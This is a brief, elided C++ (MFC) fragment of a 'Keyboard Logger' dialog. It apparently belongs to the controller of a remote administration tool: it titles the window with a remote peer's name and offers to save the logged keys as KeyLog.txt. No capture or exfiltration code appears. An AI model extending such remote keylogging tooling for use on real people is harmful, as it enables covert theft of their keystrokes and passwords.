...
BOOL CKeybdLogDlg::OnInitDialog()
{
	...
	char szName[64];
	USHORT Port;
	m_pHandler->GetPeerName(szName, Port);
	//设置窗口标题.
	CString Title;
	Title.Format(L"[%s] Keyboard Logger", CA2W(szName).m_psz);
	SetWindowText(Title);
	//
...
{
	CFileDialog FileDlg(FALSE, L"*.txt", L"KeyLog.txt", OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, L"txt file(*.txt)|*.txt", this);
